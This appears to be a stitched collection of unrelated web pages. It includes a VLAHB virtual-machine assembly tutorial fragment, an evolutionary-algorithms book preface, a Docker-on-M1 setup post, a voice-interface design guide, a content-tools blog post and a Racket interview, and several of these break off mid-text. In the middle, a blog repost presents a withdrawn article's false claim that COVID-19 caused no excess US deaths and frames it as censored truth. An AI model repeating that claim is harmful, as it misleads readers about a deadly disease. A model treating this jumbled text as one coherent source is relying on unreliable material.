        A <b>pointer</b> refers to a slot of ram that the vm treats in a _special_ way. The word _special_ refers to vm interpreting that value as an index of ram. <b>VLAHB</b> has 4 hard-coded slots for pointers, located at ram slots <b>R[4096]</b>, <b>R[4097]</b>, <b>R[4098]</b> and <b>R[4099]</b>, with the designated letters <b>U</b>, <b>V</b>, <b>Y</b>, <b>Z</b> respectively.
    </p>

    <table>
        <tbody><tr>
            <th>letter</th>
            <th>ram slot</th>
        </tr>
        <tr>
            <td>U</td>
            <td>R[4096]</td>
        </tr>
        <tr>
            <td>V</td>
            <td>R[4097]</td>
        </tr>
        <tr>
            <td>Y</td>
            <td>R[4098]</td>
        </tr>
        <tr>
            <td>Z</td>
            <td>R[4099]</td>
        </tr>
    </tbody></table>

    <br>

    <div><p>
        Look at the first two lines of asm code above. We first load 3 into 4096. The second line is <b>LD R[U] 7</b>. This tells the program to load a 7 into the ram[ram[4096]]. </p><p> Since ram[4096] = 3, we are loading 7 into ram[3].
    </p></div>

    <pre><code>ram := [0][0][0][7][0][0][0][0]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
</code></pre>

    <p><b>NB</b> There are more opcodes built into <b>VLAHB</b> that use pointers. Checkout <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a> to see them all.

    </p><hr>

    <p><b>Exercise 3</b> The code snippet below loads the integer <b>7</b> into slots 120 to 130 inclusive. Rewrite the code below using the opcode <b>LD R[U] R[V]</b>.

    </p><pre><code>LD R[120] 7
LD R[121] 7
LD R[122] 7
LD R[123] 7
LD R[124] 7
LD R[125] 7
LD R[126] 7
LD R[127] 7
LD R[128] 7
LD R[129] 7
LD R[130] 7
</code></pre>


    <h2>Conditional Opcodes</h2>

    <p>A subset of opcodes are called <b>conditional</b> and can result in the pc skipping the next line of assembly code (that's +2 lines in machine code since each valid assembly line maps to exactly 2 lines of machine code after it's compiled). These opcodes compare one value with another. These opcodes are called conditional because they may jump over an extra line of assembly depending on some condition.</p>

    <p>For example <b>CMP R[0] 2</b> checks if ram[0] is equal to 2. If it is, skip next line. Else, do nothing. Read the example below carefully</p>

    <pre><code>LD R[0] 4
LD R[1] 0

CMP R[0] 8  // if R[0] == 8, skip next line
LD R[1] 1
EXIT  // R[1]=1 at end of program
</code></pre>

    <table>
        <tbody><tr>
            <th>opcode</th>
            <th>meaning</th>
        </tr>
        <tr>
            <td>CMP</td>
            <td>is equal to</td>
        </tr>
        <tr>
            <td>LT</td>
            <td>less than, &lt;</td>
        </tr>
        <tr>
            <td>LTE</td>
            <td>less than or equal, &lt;=</td>
        </tr>
        <tr>
            <td>GT</td>
            <td>greater than, &gt;</td>
        </tr>
        <tr>
            <td>GTE</td>
            <td>greater than or equal, &gt;=</td>
        </tr>
    </tbody></table>

    <hr>

    <p><b>Exercise 4</b> What is loaded into slot <b>R[33]</b> when the program hits <b>EXIT</b>?</p>

    <pre><code>LD R[0] 3
LD R[33] 0

CMP R[0] 2

    <h2>VRAM</h2>

    <p>A subset of our ram slots are dedcated to pixels for the 160X144 px display. This happens to be the same resolution of the original Game Boy. The choice of vram slots is arbitrary so we'll pick slots from ram[4101] to ram[27140] inclusive. These slots map onto the screen from top to bottom, left to right, starting with the top-left pixel.</p>

    <p>An int stored in vram is interpreted as an rgba color. It is easier to load a hexidecmial integer as it's easier to read what color you are loading.</p>

    <p><b> Ex. 1 </b> red pixel in top left corner</p>

    <pre><code>// let's place a red pixel at the top-left corner

LD R[4101] 0XFF0000FF // rgba(255,0,0,255)
BLIT  // this draws the screen

INFINITE_LOOP:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP  // loop forever so we can see the red dot
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_1px.png"></p><p><b> Ex. 2 </b> red, green, blue pixels in top left corner</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div>

<p>Evolutionary Algorithms (<em>EAs</em>) are a fascinating class of algorithms for meta-heuristic optimisation. There exist many books on the topic of EAs, ranging from their theory to practice. The first book I read on the topic was <em>Genetic algorithms in search, optimization, and machine learning</em> by David E. Goldberg (1989), and to this day I still recommend it to new students in the field.</p>

</div>
</div>
</div><div>

<div>
<p>However, there is a re-occurring difficulty when my students are starting out in the field, <em>"how do I move from theory to practice?"</em>. Most books will have some chapters dedicated to applications of EAs, but what's missing is an up-to-date book dedicated to using modern technology and concepts.</p>
</div>
</div><div>

<div>
<div>
<p>When writing this book, I had to answer some difficult questions:</p>
<ul>
<li>What programming language will my examples be written in?</li>
<li>What software libraries will I use?</li>
<li>How do I structure the chapters and sections, do I lead entirely by example or do I dedicate some parts to the theory?</li>
<li>Do I focus on single-objective EAs or multi-objective EAs?</li>
</ul>
<p>Nevertheless, the decisions had to be made. I selected Python as the programming language simply due to its rise in popularity (in 2019), and this was only a difficult choice because there is a wealth of resources written for MATLAB. Of the resources written in MATLAB, it is a shame to not be able to use PlatEMO, which is a well-maintained open-source platform for Evolutionary Multi-objective Optimisation. In its place, when a software library is needed, I will turn to Platypus, which provides optimisation algorithms and analysis tools for multi-objective optimisation.</p>
<p>For the structure of the chapters and sections, I have decided to lead entirely by example. There will be code to demonstrate every concept used, and I will show how we can implement algorithms from their mathematical representation. In these cases, I will focus on the readability of the implementations rather than their performance.</p>
<p>Finally, I will focus on multi-objective EAs as this represents the majority of real-world problems. However, single-objective EAs will make an appearance to highlight the differences between the two.</p>

</div>
</div>
</div><div>

<div>
<p>Perhaps the most difficult question to answer is <em>where do we start?</em> There is so much to cover, and many potential starting points. For this book, I will start with a definition of objective functions, and illustrate the relationship between what we call the problem space and the objective space. With this approach, I hope there will be a clear understanding of what the various operators within an EA are affecting.</p>

I would summarize it for you or offer pull-quotes but honestly you just have to read it yourself because it's mind-blowing. <a target="_blank" href="https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19">The original article</a> is now deleted from the Johns Hopkins website ... for some reason. Luckily the internet is forever and it's available via<a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19"> the Wayback Machine</a>. Here is the article in its entirety:</p><p>* * *</p><p>According to <a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.theguardian.com/world/2020/nov/21/covid-world-map-which-countries-have-the-most-coronavirus-cases-and-deaths">new data</a>, the U.S. currently ranks first in total COVID-19 cases, new cases per day and deaths. Genevieve Briand, assistant program director of the Applied Economics master's degree program at Hopkins, critically analyzed the effect of COVID-19 on U.S. deaths using data from the Centers for Disease Control and Prevention (CDC) in her webinar titled "COVID-19 Deaths: A Look at U.S. Data."</p><p>From mid-March to mid-September, U.S. total deaths have reached 1.7 million, of which 200,000, or 12% of total deaths, are COVID-19-related. Instead of looking directly at COVID-19 deaths, Briand focused on total deaths per age group and per cause of death in the U.S. and used this information to shed light on the effects of COVID-19.</p><p>She explained that the significance of COVID-19 on U.S. deaths can be fully understood only through comparison to the number of total deaths in the United States.</p><p>After retrieving data on the CDC website, Briand compiled a graph representing percentages of total deaths per age category from early February to early September, which includes the period from before COVID-19 was detected in the U.S. to after infection rates soared.</p><p>Surprisingly, the deaths of older people stayed the same before and after COVID-19. Since COVID-19 mainly affects the elderly, experts expected an increase in the percentage of deaths in older age groups. However, this increase is not seen from the CDC data. In fact, the percentages of deaths among all age groups remain relatively the same.</p><p>"The reason we have a higher number of reported COVID-19 deaths among older individuals than younger individuals is simply because every day in the U.S. older individuals die in higher numbers than younger individuals," Briand said.</p><p>Briand also noted that 50,000 to 70,000 deaths are seen both before and after COVID-19, indicating that this number of deaths was normal long before COVID-19 emerged. Therefore, according to Briand, not only has COVID-19 had no effect on the percentage of deaths of older people, but it has also not increased the total number of deaths.</p><p>These data analyses suggest that in contrast to most people's assumptions, the number of deaths by COVID-19 is not alarming. In fact, it has relatively no effect on deaths in the United States.</p><p>This comes as a shock to many people. How is it that the data lie so far from our perception?</p><p>To answer that question, Briand shifted her focus to the deaths per causes ranging from 2014 to 2020. There is a sudden increase in deaths in 2020 due to COVID-19. This is no surprise because COVID-19 emerged in the U.S. in early 2020, and thus COVID-19-related deaths increased drastically afterward.</p><p>Analysis of deaths per cause in 2018 revealed that the pattern of seasonal increase in the total number of deaths is a result of the rise in deaths by all causes, with the top three being heart disease, respiratory diseases, influenza and pneumonia.</p><p>"This is true every year. Every year in the U.S. when we observe the seasonal ups and downs, we have an increase of deaths due to all causes," Briand pointed out.</p><p>When Briand looked at the 2020 data during that seasonal period, COVID-19-related deaths exceeded deaths from heart diseases. This was highly unusual since heart disease has always prevailed as the leading cause of deaths. However, when taking a closer look at the death numbers, she noted something strange. As Briand compared the number of deaths per cause during that period in 2020 to 2018, she noticed that instead of the expected drastic increase across all causes, there was a significant decrease in deaths due to heart disease. Even more surprising, as seen in the graph below, this sudden decline in deaths is observed for all other causes.</p><mediatag id="57319"></mediatag><p><i>Graph depicts the number of deaths per cause during that period in 2020 to 2018.</i></p><p>This trend is completely contrary to the pattern observed in all previous years. Interestingly, as depicted in the table below, the total decrease in deaths by other causes almost exactly equals the increase in deaths by COVID-19. This suggests, according to Briand, that the COVID-19 death toll is misleading. Briand believes that deaths due to heart diseases, respiratory diseases, influenza and pneumonia may instead be recategorized as being due to COVID-19.</p><mediatag id="57320"></mediatag><p><i>Graph depicts the total decrease in deaths by various causes, including COVID-19.</i></p><p>The CDC classified all deaths that are related to COVID-19 simply as COVID-19 deaths. Even patients dying from other underlying diseases but are infected with COVID-19 count as COVID-19 deaths. This is likely the main explanation as to why COVID-19 deaths drastically increased while deaths by all other diseases experienced a significant decrease.</p><p>"All of this points to no evidence that COVID-19 created any excess deaths. Total death numbers are not above normal death numbers. We found no evidence to the contrary," Briand concluded.</p><p>In an interview with <i>The News-Letter</i>, Briand addressed the question of whether COVID-19 deaths can be called misleading since the infection might have exacerbated and even led to deaths by other underlying diseases.</p><p>"If [the COVID-19 death toll] was not misleading at all, what we should have observed is an increased number of heart attacks and increased COVID-19 numbers. But a decreased number of heart attacks and all the other death causes doesn't give us a choice but to point to some misclassification," Briand replied.</p><p>In other words, the effect of COVID-19 on deaths in the U.S. is considered problematic only when it increases the total number of deaths or the true death burden by a significant amount in addition to the expected deaths by other causes. Since the crude number of total deaths by all causes before and after COVID-19 has stayed the same, one can hardly say, in Briand's view, that COVID-19 deaths are concerning.</p><p>Briand also mentioned that more research and data are needed to truly decipher the effect of COVID-19 on deaths in the United States.</p><p>Throughout the talk, Briand constantly emphasized that although COVID-19 is a serious national and global problem, she also stressed that society should never lose focus of the bigger picture — death in general.</p><p>The death of a loved one, from COVID-19 or from other causes, is always tragic, Briand explained. Each life is equally important and we should be reminded that even during a global pandemic we should not forget about the tragic loss of lives from other causes.</p><p>According to Briand, the over-exaggeration of the COVID-19 death number may be due to the constant emphasis on COVID-19-related deaths and the habitual overlooking of deaths by other natural causes in society.</p><p>During an interview with <i>The</i> <i>News-Letter </i>after the event, Poorna Dharmasena, a master's candidate in Applied Economics, expressed his opinion about Briand's concluding remarks.</p><p>"At the end of the day, it's still a deadly virus. And over-exaggeration or not, to a certain degree, is irrelevant," Dharmasena said.</p><p>When asked whether the public should be informed about this exaggeration in death numbers, Dharmasena stated that people have a right to know the truth. However, COVID-19 should still continuously be treated as a deadly disease to safeguard the vulnerable population.</p><p>* * *</p><p>Facebook and Twitter will certainly block this article within hours of its publication.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1606480641864" id="item-5fc0f2d33f75b16643f61aae"><div><div><div data-block-type="44" id="block-3e269a4e320cdf7cc7e4"><div><p data-preserve-html-node="true">This is a follow-up post to <a data-preserve-html-node="true" href="https://finestructure.co/blog/2020/11/27/running-docker-on-apple-silicon-m1">“Running Docker on Apple Silicon M1”</a>, continuing the journey of exploring Docker on Apple’s new M1 machines.</p>

<p data-preserve-html-node="true">We left off at booting an ARM Linux virtual machine, and installing &amp; running Docker inside it. This works fine and allows you run containers like for instance a Postgres database. They can expose their ports and instead of connecting to <code data-preserve-html-node="true">localhost:5432</code> on the host, you connect to your VM’s IP address, for instance <code data-preserve-html-node="true">192.168.64.8:5432</code>.</p>

<p data-preserve-html-node="true">Now in case you’re not aware, Docker is actually a service that exposes an API over HTTP and when you run <code data-preserve-html-node="true">docker</code> commands, they control the service via these API requests on a local socket. You’ve probably seen the reference to <code data-preserve-html-node="true">unix:///var/run/docker.sock</code> at times.</p>

<p data-preserve-html-node="true">What that means is that it’s possible to direct your <code data-preserve-html-node="true">docker</code> client to talk to a Docker service over the network, and that’s what we can do as well to enable “regular” docker commands to work with a locally running “Linux Docker VM”.</p>

<p data-preserve-html-node="true">Incidentally, that’s exactly what “Docker for Mac” is doing under the hood: it is actually a <a data-preserve-html-node="true" href="https://github.com/moby/hyperkit">VM based on Apple’s Hypervisor framework</a> which hosts Docker, not your Mac itself.</p>

<h2 data-preserve-html-node="true">Installing “Docker for Mac”</h2>

<p data-preserve-html-node="true">In order to get started, we need to obtain the Docker client app. I migrated my existing setup from a Time Machine backup and therefore had Docker installed from the start. If you need to install from scratch, <a data-preserve-html-node="true" href="https://docs.docker.com/engine/install/binaries/">installing the client binaries</a> is probably the easiest way to get started.</p>

<p data-preserve-html-node="true">Assuming you have a <code data-preserve-html-node="true">docker</code> binary to hand, you’re good to go. The way we’ll set up the connection is via a “docker context” and all this is <a data-preserve-html-node="true" href="https://twitter.com/johannesweiss/status/1332271974719090688?s=21">thanks to a tip by Johannes Weiss</a>.</p>

<h2 data-preserve-html-node="true">Setting up SSH in virtual machine</h2>

<p data-preserve-html-node="true">First though, we need to configure to connect to our VM via SSH. Install the SSH server:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt-get install openssh-server</code></pre>

<p data-preserve-html-node="true">and copy your public key to the <code data-preserve-html-node="true">ubuntu</code> user’s <code data-preserve-html-node="true">authorized_keys</code> for password-less access.</p>

<p data-preserve-html-node="true">In order to connect to the VM, you’ll need to find its IP address (which is on a <code data-preserve-html-node="true">192.168.64.0</code> network if you’ve followed along from the previous blog post).</p>

<p data-preserve-html-node="true">Our image comes without <code data-preserve-html-node="true">net-tools</code>, so we’ll install these first:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt install net-tools</code></pre>

<p data-preserve-html-node="true">and then run</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ifconfig <span>|</span> grep 192.168</code></pre>

<p data-preserve-html-node="true">which should yield the following</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true"><a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="86f3e4f3e8f2f3c6f3e4f3e8f2f3">[email&nbsp;protected]</a>:<span>~</span>$ ifconfig <span>|</span> grep 192.168
        inet 192.168.64.8  netmask 255.255.255.0  broadcast 192.168.64.255</code></pre>

<p data-preserve-html-node="true">With all this out of the way, we can test the connection from the host:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ssh <a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="611403140f1514215058534f5057594f57554f59">[email&nbsp;protected]</a></code></pre>

<figure data-preserve-html-node="true"><img data-preserve-html-node="true" src="https://f000.backblazeb2.com/file/finestructure-public-images/posts/ssh-login.png"></figure>

<h2 data-preserve-html-node="true">Setting up a Docker context</h2>

<p data-preserve-html-node="true">The remaining steps are simple. We create a Docker context:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="aedbccdbc0dadbee9f979c809f989680989a8096">[email&nbsp;protected]</a>"</span></code></pre>

<p data-preserve-html-node="true">and tell Docker to use it</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context use myvm</code></pre>

<p data-preserve-html-node="true">Now all docker commands are targeting the virtual machine, just like they do in Docker for Mac.</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">❯ docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="e49186918a9091a4d5ddd6cad5d2dccad2d0cadc">[email&nbsp;protected]</a>"</span>
myvm
Successfully created context <span>"myvm"</span>
<span>~</span>
❯ docker context use myvm
myvm
<span>~</span>
❯ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
<span>~</span>
❯ docker run hello-world

Hello from Docker<span>!</span>
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the <span>"hello-world"</span> image from the Docker Hub.
    (arm64v8)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/</code></pre>

<p data-preserve-html-node="true">You can find out more about <code data-preserve-html-node="true">docker context</code> in the <a data-preserve-html-node="true" href="https://docs.docker.com/engine/context/working-with-contexts">online documentation</a>.</p>

<p data-preserve-html-node="true">Bear in mind that this setup does not come with the convenience of Docker for Mac’s bridge networking or support for volumes – but surely these aren’t far off.</p>

November 27, 2020 | https://www.speechly.com/blog/voice-application-design-guide/ | <a href="https://web.archive.org/web/*/https://www.speechly.com/blog/voice-application-design-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>For the past 4 years at Speechly, we have been experimenting and developing ways to make use of voice-enabled touch screen apps fast and straight-forward, in other words – more productive. In this article, we'll introduce the concepts and guidelines we've found effective in creating voice enabled apps that are robust and enable users to complete tasks faster and with less attention.</p><p>Our approach takes advantage of customizable voice actions and the availability of a (touch) display for providing real-time visual feedback and options. As a result, the app can be controlled with both the <a href="https://www.speechly.com/blog/what-is-voice-user-interface/">voice user interface (VUI)</a> and the graphic user interface (GUI), allowing the user to choose the best input method for the occasion. A voice interface can be thought of a controller for app actions which makes it <a href="https://www.speechly.com/blog/voice-user-interfaces-for-react/">retrofittable to an existing application</a>.</p><p>We contrast this approach to now-popular voice assistants like Apple’s Siri, Google Home and Amazon Alexa, which are conversational in nature and are typically optimized for generic hands-free use with voice.</p><h2>Setting the right context</h2><h3>1. Don't try to build a voice assistant</h3><p>Voice assistants are digital assistants that react to voice commands, most often by using voice themselves, too. While there are good use cases for voice assistants, their way of using voice is not suitable for touch screen devices.</p><p>Instead of question-answer based dialogues, touch screen voice experiences should be based on real-time visual feedback. As the user speaks, the user interface should be instantaneously updated.</p><h3>2. Users don’t want to converse</h3><p>When we humans talk with each other, we do more than transmit information by using words. We might greet, persuade, declare, ask or apologize and even the same words can have a different meaning, depending on how we say it and in which situations. This is very human-like, but not the way we want to communicate with a computer.</p><p>With voice user interface, speech has only one function and it is to command the system to do what the user wants. Be clear that the user is talking with a computer, don’t try to imitate a human. In most cases, the application should not answer in natural language. It should react by updating the user interface, just like when clicking a button.</p><h3>3. Give visual guidance on what the user can say</h3><p>An issue commonly described in voice user interfaces (VUI) users is the uncertainty related to what commands are supported.</p><p>The problem arises from the fact that the typical voice assistant experience begins from a blank slate, where the assistants start listening and is expected to be able to help the user with pretty much anything. This is of course not really true as anybody who has tried these services understands.</p><p>Understanding the supported functionality with traditional graphical user interfaces (GUI) is less of a problem. Placing a button in the users shopping cart that reads “proceed to checkout” is a very strong signal to the users that checkout is supported and by pressing the button the user will indeed proceed to the checkout process. This aspect is missing from voice-only solutions which cases uncertainty in terms of supported features.</p><p>This is why a good voice user interface should be supported if possible by a graphical user interface.</p><p>Booking air flights - Graphical user interface supporting the voice user interface</p><h3>4. Use voice for the tasks it is good for</h3><p>Good design is about providing the user with the best tools for their use task.</p><p>Voice works great for use tasks such as <a href="https://www.speechly.com/blog/voice-search/">search filtering</a> – “Show me the nearest seafood restaurants with three or more stars”, accessing items from a known inventory – “Add milk, bread, chicken and potatoes”, inputting information: “Book a double room for two in Los Angeles next Friday” and unambiguous commands, such as “Show sports news”.</p><p>On the other hand, touch is often the better option for selecting from a couple of options, typing things such as email addresses and passwords and browsing by scrolling a large unknown inventory, for example.</p><p>There’s no need to replace your current user interface with a voice user interface. Rather you should evaluate which tasks in your application are the most tedious and easiest to do by using voice and add voice as a modality to those features.</p><div><div><div><p>Sign up to our Voice Design Crash Course and learn the best practices for creating great voice user interfaces.</p></div></div></div><h2>Receiving commands from the user</h2><h3>5. Onboard the user</h3><p>When your users first see your voice UI, they will need some guidance on how to use it.</p><p>These examples should be placed close to where the visual feedback will appear. You can hide the examples after the user has tried the voice user interface.</p><h3>6. Avoid using a wake word</h3><p>While voice assistants use a wake word so that they can be activated from a distance, your touch screen application doesn’t need to. Repeating the wake word every time makes the experience jarring, adds latency and decreases the reliability.</p><p>The hands free scenario is far less relevant than you might initially think, as the user is already holding the device. There are also privacy risks involved with a wake word.</p><h3>7. Prefer push-to-talk button mechanism</h3><p>Push-to-talk is the best way to operate a microphone in a multimodal touch screen application. When the user is required to press a button while talking, it’s completely clear when the application is listening. This also decreases latency by making endpointing very explicit, eliminating the possibility of endpoint false positives (system stops listening prematurely) and false negatives (systems does not finalize request after user has finished the command).</p><p>On the desktop you can use the spacebar for activating the microphone.</p><p>You can also add a slide as an optional gesture to lock the microphone for a longer period of time. WhatsApp has a good implementation of the design in their app.</p><h3>8. Signal clearly when the microphone button is pushed down.</h3><p>To make it sure the user knows that the application is listening, signal clearly when the microphone button is pushed down. This is especially important if using the push-to-talk pattern.</p><p>You can use sound, animation, tactile feedback (vibration) or a combination to signal the activation. On a handheld touch screen device, make sure that the activated microphone icon is visible from behind the thumb when push-to-talk is activated.</p><h2>Giving feedback to the user</h2><h3>9. Use non-interruptive modalities for feedback</h3><p>Non-interruptive modalities include haptic, non-linguistic auditory, and perhaps most importantly visual feedback. Using these modalities, the application can react fast and without interruption to the user. For instance, in the case of “I’m interested in t-shirts,” the UI would swiftly show the most popular t-shirt products, instantly enabling the user to continue with a refining utterance, ”do you have Boss.” This narrows further down the displayed products to show only the Boss branded t-shirts.</p><p>On the other hand, voice synthesis is a bad idea for feedback, as any ongoing user utterance will be abruptly interrupted. Voice is also a pretty slow channel for transmitting information and for returning users, hearing the same speech synthesises every time gets annoying very fast.</p><h3>10. Minimize latency with streaming natural language understanding</h3><p>One important part of user experience is the perceived responsiveness of the application. Designers are using tricks such as lazy loading, doing tasks on background, visual illusions and preloading of content to make their applications seem faster and this should be done with voice, too.</p><p>In voice applications, immediate UI reaction is even more important. Immediate UI reaction encourages the user to use longer expression and to continue the voice experience. In case of an error, it enables the user to recover fast.</p><h3>11. Steer user’s gaze and visual attention</h3><p>When using voice effectively the user can control the UI an order of magnitude faster compared to tapping and clicking. This means that a lot of stuff might be happening in the UI. It is important that the user can keep up with these UI reactions.</p><p>Typically UI reactions manifest themselves in some sort of visual queues, micro animations and transitions. There is an instinctive inclination in the human visual cognition system to move visual focus to where movement is happening.</p><p>Therefore it is an antipattern to scatter visual ui reactions all over the visual field of the user, e.g. streaming transcription animation on top of the screen and other ui reactions at the bottom of the screen. This will result in the user's gaze bouncing back and forth on the screen making it very hard to understand what is happening in the user interface and inflicting unnecessary cognitive load and annoyance to the user.</p><p>For this reason it is important to either centralize all visual UI reactions near one focal point,meaning that both the transcript as well as the visual transitions resulting from the user commands are shown very close to each other. The other option is to steer the users gaze linearly on the screen with a cascade of animations happening e.g. top down, left to right.</p><h3>12. Minimize visual unrest in triggered events.</h3><p>While a voice user interface needs to be as close to real-time as possible, minimize flicker and visual unrest. You can use placeholder images and elements to make sure the application looks smooth and reacts fast. Recovering from misinterpretation</p><h3>13. Show the text transcript</h3><p>Text transcription of users’ voice input is the most important part of the feedback in case of an error. Lack of action tells the user their input was not correctly understood, but in case of an error in the speech recognition, the transcript can enable them to understand why that happened.</p><p>Transcript can also be valuable for the user when everything goes right. It tells the user they are being understood and encourages them to continue.</p><p>The transcript should appear always in the same, center place in the users’ field of vision. If you are using Speechly, you can use the …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>My digital life in a nutshell: I discover relevant content I don’t have time to consume, I find time and become overwhelmed with my scattered backlog, I wish the content were in a different format, and then I’m unable to find something again once I’ve consumed it. <a href="https://andymatuschak.org/books/">Not retaining enough</a> is a valid problem but we’ll tackle that one later.</p><p>There’s a lot of generalization in my summary but <strong>the core issue is an extraordinarily high level of friction in the process of finding, organizing, and sharing digital content</strong>. During the past few years I’ve noticed:</p><ul><li><p>The more seamless the acquisition &amp; ingestion, the more engaged I am with the content</p></li><li><p>Insights are just as likely to be found in a 400-page book as in a 40-minute podcast</p></li><li><p>Notes and their subsequent review are essential for long-term retention</p></li><li><p>Recommendations from other humans are as good, if not better, than algorithmic suggestions</p></li></ul><p>In the rest of this post I attempt to explain the digital tools I wish existed, and how the the currently available tools do not suffice. What are also probably lacking are my <a href="https://www.buildingasecondbrain.com/">habits and workflows</a> around this - but I’m looking at tools specifically here.</p><h2 id="queue-management-for-inbound-digital-content">Queue management for inbound digital content&nbsp;<a href="#queue-management-for-inbound-digital-content">#</a></h2><p>Where to begin? Probably the most common problem I see myself and other people dealing with is processing the incoming deluge of articles to read and videos to watch. This isn’t all personal recommendations - it encompasses any and all content I think my future self would appreciate me consuming. A list of issues, roughly by order of appearance:</p><ul><li><p>Content (or links to it) arrive from a variety of sources including text messages from friends, email conversations, tweetstorms and replies, references in books, suggestions in real-world conversations, and more.</p></li><li><p>Every book, article, post, or tweet has the potential to lead to more content.</p></li><li><p>Content is published in a variety of formats including but not limited to images, sound files, videos, Google Drive docs, diagrams, long-form paywalled articles, PDFs, powerpoint presentations, and base 64 encoded blobs.</p></li><li><p>I have little visibility into required time investment and foundational context until I’ve opened it and started thinking about it. Should I sit down with a pen and paper to read this or can I skim it while waiting for my coffee?</p></li><li><p>Learning, work, news, and entertainment all have different priorities in my life (roughly in that order).</p></li><li><p>I would like to batch process content in different “streams” regardless of where they are stored. For example: I have two hours, let me work through interesting text content my friends sent me last week. Or: show me all the interesting/relevant videos I’ve queued over the past month.</p></li><li><p>I’m not always connected to a stable internet connection.</p></li><li><p>If it’s a long piece of content I want my position saved reliably so I can resume at a later point.</p></li><li><p>I often want it in a different format than the one it was originally published in (audio → text, text → audio, pdf → ebook). Automated conversion works but is cumbersome.

It feels like every week I’m speaking with someone and I remember a blog post I read a few months ago they might find relevant … or was it a Reddit post? Can I find it my history? Oh no, it’s been replaced with <code>[deleted]</code> … find an archived copy… rinse and repeat.</p></li></ul><figure><img src="https://imgs.xkcd.com/comics/icon_swap.png"><figcaption>Relevant XKCD, as is tradition</figcaption></figure><p>Following my curiosity feels like chasing a caffeinated bunny around while real understanding requires time, perspective, and reflection. The internet makes the former much easier - so I find myself constantly balancing the two. Additionally, my energy and attention levels vary throughout the day and it’s far easier to just open Twitter rather than continue reading a long-form article I started on my laptop two days ago.

Here’s <a href="https://jon.bo/books">my own</a>. I find everyone keeps their reading lists in different formats on different platforms. Plaintext lists are nice but hard to parse. Spreadsheets are easy to parse but a pain to manage. Third-party services aren’t interoperable, require logins, and are not future-proof.</p><p>Part of the problem here is <a href="https://people.well.com/user/doctorow/metacrap.htm">metadata is hard</a>. Someone has to sit there and fill out the author, title, subtitle, summary, page count - and they’re probably not going to do it for free. Amazon is a good at it but <a href="https://stallman.org/amazon.html#publishing">is hostile to publishers</a>. Goodreads has much potential but <a href="https://onezero.medium.com/almost-everything-about-goodreads-is-broken-662e424244d5">seems to have stagnated</a>. Linking to the book’s Wikipedia entry would be my preference but very few books have an entry.</p><p>Whatever this tool for managing my ever-growing reading list will be, it should:</p><ul><li><p>Let me compare my reading list with another to see overlap. I find this a wonderful way to spark conversation and find common interests.</p></li><li><p>Allow me to tag books instead of placing them into static lists (think clusters or tag clouds).</p></li><li><p>Be tied to my highlights, annotations, and bookmarks in a non-proprietary, searchable, and shareable format. Make them public if I want to.</p></li><li><p>Save context on where and when I found this book: why I thought it was important to read, when I read it, what I wrote down while reading it, and what other content I discovered through it.</p></li><li><p>Let me query this tool like a relational database. For example: show me all books about scaling startups recommended by people I follow on Twitter or by people they follow.

What makes it stand out in the LISP family?</strong></h2><p id="b428">Let’s distinguish “Racket the language” and “Racket the project”.</p><p id="f2e2">The Racket language is a general-purpose, Scheme-like language with an especially rich set of constructs for extending the language — even by Scheme standards. Racket includes support for writing quick-and-dirty macros, but it also supports nice macros with a good error checking that avoid surprising errors created in the expanded code. The close integration of macros and modules, an enforced phase separation between run-time and compile-time code, and the `#lang` mechanism for selecting the surface syntax all distinguish Racket from other Lisp variants.</p><p id="d48e">Even the main language Racket is written in a simpler language, and that is written in an even more simple language. This tower of languages makes development easier. You can look under the hood and see all the internal languages, or just ignore all of them and get a nice high level language.</p><p id="36f0">Less prominent, but also as important in practice for building language abstractions and composing them into large systems, are Racket’s run-time constructs: first-class control with continuation marks, custodians for simple and reliable task termination, reachability-based memory accounting, message-based parallelism via places, and Concurrent ML-style constructs for event-driven programs. Many of these constructs need support at lower levels of the runtime system, but then they can be used to build a wide variety of languages and libraries that mesh well.</p><p id="cb77">The Racket project synthesizes research, production, and education efforts toward the overall language-building goal. The idea of “A Programmable Programming Language” serves along those directions, from building student-friendly learning environments to domain-specific languages in application to pushing the frontiers of language design and implementation.</p><p id="a39d">The main page is <a href="https://racket-lang.org/" 